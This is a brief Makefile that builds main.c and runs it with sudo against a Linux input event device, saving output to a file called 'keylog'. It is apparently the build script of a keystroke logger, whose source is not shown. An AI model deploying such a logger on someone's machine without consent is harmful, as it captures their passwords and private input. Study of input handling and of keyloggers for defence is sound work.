EVENT_FILE=/dev/input/event3 # NOTE: hardware specific - must change.
LOG_FILE=./keylog

all:
	gcc -Wall -Wextra -o main main.c
run:all
	sudo ./main $(EVENT_FILE) $(LOG_FILE)
clean:
	rm -f main $(LOG_FILE)
